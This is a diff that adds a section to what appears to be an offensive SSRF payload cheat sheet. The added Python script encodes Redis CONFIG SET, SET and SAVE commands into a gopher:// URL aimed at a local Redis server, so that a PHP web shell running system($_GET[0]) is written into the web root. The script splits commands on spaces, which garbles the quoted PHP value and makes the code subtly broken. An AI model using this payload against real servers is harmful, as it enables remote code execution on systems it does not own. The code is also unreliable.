@@ -120,6 +120,28 @@ SET x "<?php system($_GET[0]); ?>"
 SAVE
 ```
 
+Encode Redis commands for gopher:
+
+```python
+from urllib.parse import quote
+
+cmds = [
+    'CONFIG SET dir /var/www/html',
+    'CONFIG SET dbfilename shell.php',
+    'SET x "<?php system($_GET[0]); ?>"',
+    'SAVE',
+]
+
+raw = ''
+for cmd in cmds:
+    parts = cmd.split(' ')
+    raw += f"*{len(parts)}\r\n"
+    for p in parts:
+        raw += f"${len(p)}\r\n{p}\r\n"
+
+print("gopher://127.0.0.1:6379/_" + quote(raw))
+```
+
 ## PHP-FPM / FastCGI
 
 ```text
